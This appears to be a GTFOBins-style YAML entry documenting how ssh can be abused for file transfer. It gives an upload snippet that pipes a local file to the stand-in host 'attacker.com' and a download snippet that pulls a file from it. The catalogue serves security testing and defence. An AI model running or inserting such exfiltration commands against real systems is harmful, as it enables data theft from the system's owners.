---
functions:
  file-upload:
    - description: Send local file to a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=file_to_save
        LPATH=file_to_send
        ssh $HOST "cat > $RPATH" < $LPATH
  file-download:
    - description: Fetch a remote file from a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=file_to_get
        LPATH=file_to_save
        ssh $HOST "cat $RPATH" > $LPATH
---
